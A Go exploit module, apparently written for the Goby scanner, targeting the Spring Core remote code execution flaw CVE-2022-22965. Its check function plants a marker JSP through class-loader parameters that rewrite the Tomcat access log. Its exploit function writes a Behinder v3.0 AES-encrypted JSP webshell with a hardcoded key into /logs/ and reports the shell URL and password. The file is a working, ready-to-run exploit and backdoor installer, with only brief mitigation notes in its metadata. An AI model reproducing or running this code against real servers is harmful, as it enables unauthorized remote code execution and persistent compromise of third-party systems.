package exploits

import (
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Spring Core Framework Remote Code Execution Vulnerability(CVE-2022-22965)",
    "Description": "<p>Spring core is a toolkit for discovering, creating and processing the relationship between beans in the Spring series.</p><p>An unauthenticated attacker could use this vulnerability for remote arbitrary code execution. The vulnerability exists widely in the Spring framework and derived frameworks, and JDK 9.0 and above will be affected. Products using older JDK versions are not affected.</p>",
    "Impact": "Spring Core Framework Remote Code Execution Vulnerability(CVE-2022-22965)",
    "Recommendation": "<p>Temporary:</p><p>1. Using WAF intercepts requests with keyword 'class';</p><p>2. JDK version fallback to jdk8 higher version.</p>",
    "Product": "Spring",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Spring Framework 远程代码执行漏洞（CVE-2022-22965）",
            "Description": "<p>Spring core是Spring系列产品中用来负责发现、创建并处理bean之间的关系的一个工具包，是一个包含Spring框架基本的核心工具包，Spring其他组件都要使用到这个包。</p><p>未经身份验证的攻击者可以使用此漏洞进行远程任意代码执行。 该漏洞广泛存在于Spring 框架以及衍生的框架中，并JDK 9.0及以上版本会受到影响。使用旧JDK版本的产品不受影响。</p>",
            "Impact": "<p><span style=\"color: rgb(53, 53, 53); font-size: 14px;\">攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span><br></p>",
            "Recommendation": "<p>临时方案：</p><p>1、WAF 拦截带有 class 关键字的请求；</p><p>2、JDK 版本回退至 JDK8 较高版本。</p>",
            "Product": "Spring",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Spring Core Framework Remote Code Execution Vulnerability(CVE-2022-22965)",
            "Description": "<p>Spring core is a toolkit for discovering, creating and processing the relationship between beans in the Spring series.</p><p>An unauthenticated attacker could use this vulnerability for remote arbitrary code execution. The vulnerability exists widely in the Spring framework and derived frameworks, and JDK 9.0 and above will be affected. Products using older JDK versions are not affected.</p>",
            "Impact": "Spring Core Framework Remote Code Execution Vulnerability(CVE-2022-22965)",
            "Recommendation": "<p>Temporary:</p><p>1. Using WAF intercepts requests with keyword '<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">class</span>';</p><p>2. JDK version fallback to jdk8 higher version.</p>",
            "Product": "Spring",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "url_hostinfo!=\"\"",
    "GobyQuery": "url_hostinfo!=\"\"",
    "Author": "balisong2",
    "Homepage": "https://spring.io/",
    "DisclosureDate": "2022-03-29",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [
        "CVE-2022-22965"
    ],
    "CNVD": [
        "CNVD-2022-23942"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10263"
}`

	md5Hash := func(num string) string {
		md5hash := md5.New()
		md5hash.Write([]byte(num))
		return hex.EncodeToString(md5hash.Sum(nil))
	}
	jspUploadFileCheck := func(str string) (shellContent, check string) {
		md5Str := md5Hash(str)
		base64str := base64.StdEncoding.EncodeToString([]byte(md5Str))
		shellContent = fmt.Sprintf("<%% out.println(new String(java.util.Base64.getDecoder().decode(\"%s\")));%%>", base64str)
		return shellContent, md5Str
	}
	processData := func(hostinfo *httpclient.FixUrl, urlObj *url.URL, payload, randomInt, randPrefix string) error {
		send := "class.module.classLoader.resources.context.parent.appBase=./" +
			"&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" +
			"&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" +
			randomInt +
			"&class.module.classLoader.resources.context.parent.pipeline.first.checkExists=true" +
			"&class.module.classLoader.resources.context.parent.pipeline.first.rotatable=true" +
			fmt.Sprintf("&class.module.classLoader.resources.context.parent.pipeline.first.prefix=%s", randPrefix) +
			"&class.module.classLoader.resources.context.parent.pipeline.first.buffered=false" +
			fmt.Sprintf("&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%s", payload)
		if strings.ToUpper(hostinfo.Method) == "POST" {
			urlPath := urlObj.Path
			if urlPath == "" {
				urlPath = "/"
			}
			if len(urlObj.RawQuery) > 0 {
				urlPath = urlPath + "?" + urlObj.RawQuery
			}
			cfg := httpclient.NewPostRequestConfig(urlPath)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = send
			_, err := httpclient.DoHttpRequest(hostinfo, cfg)
			if err != nil {
				return err
			}
		} else if strings.ToUpper(hostinfo.Method) == "GET" {
			urlPath := urlObj.Path
			if urlPath == "" {
				urlPath = "/"
			}
			urlPath = urlPath + "?" + send
			cfg := httpclient.NewGetRequestConfig(urlPath)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			_, err := httpclient.DoHttpRequest(hostinfo, cfg)
			if err != nil {
				return err
			}
		}
		return nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			urlObj, err := url.Parse(u.String())
			if err != nil {
				return false
			}
			randStr := goutils.RandomHexString(7)
			shellContent, checkStr := jspUploadFileCheck(randStr)
			shellContent = strings.Replace(shellContent, "<%", "<%{%}t", -1)
			shellContent = strings.Replace(shellContent, "%>", "%{%}t>", -1)
			shellContent = url.PathEscape(shellContent)
			fmt.Println(shellContent)
			r := rand.New(rand.NewSource(time.Now().UnixNano()))
			randomIntS := 10000 + r.Intn(100000-1)
			randomInt := strconv.Itoa(randomIntS)
			randPrefix := goutils.RandomHexString(5)
			err = processData(u, urlObj, shellContent, randomInt, randPrefix)
			if err != nil {
				return false
			}
			checkCfg := httpclient.NewGetRequestConfig("/logs/" + randPrefix + randomInt + ".jsp")
			checkCfg.VerifyTls = false
			checkCfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, checkCfg); err == nil {
				if strings.Contains(resp.RawBody, checkStr) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			urlObj, err := url.Parse(expResult.HostInfo.String())
			if err != nil {
				return expResult
			}
			shellContent, checkStr := "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"3a1115b1f81af9aa\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);}%>", "XVlBzg"
			shellContent = strings.Replace(shellContent, "<%", "<%{%}t", -1)
			shellContent = strings.Replace(shellContent, "%>", "%{%}t>", -11)
			payloadArr := strings.SplitN(shellContent, ",", 5)
			var payload string
			for k, v := range payloadArr {
				if k == 0 {
					payload += v
					continue
				}
				payload += fmt.Sprintf("&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%s", v)
			}
			shellContent = url.PathEscape(payload)
			r := rand.New(rand.NewSource(time.Now().UnixNano()))
			randomIntS := 10000 + r.Intn(100000-1)
			randomInt := strconv.Itoa(randomIntS)
			randPrefix := goutils.RandomHexString(5)
			err = processData(expResult.HostInfo, urlObj, shellContent, randomInt, randPrefix)
			time.Sleep(1 * time.Second)
			processData(expResult.HostInfo, urlObj, "", randomInt, randPrefix)
			if err != nil {
				return expResult
			}
			checkCfg := httpclient.NewGetRequestConfig("/logs/" + randPrefix + randomInt + ".jsp")
			checkCfg.VerifyTls = false
			checkCfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, checkCfg); err == nil && resp.StatusCode != 404 {
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/logs/" + randPrefix + randomInt + ".jsp" + "\n"
				expResult.Output += "Password: " + checkStr + "\n"
				expResult.Output += "WebShell tool: Behinder v3.0"
				expResult.Success = true
			}
			return expResult
		},
	))
}
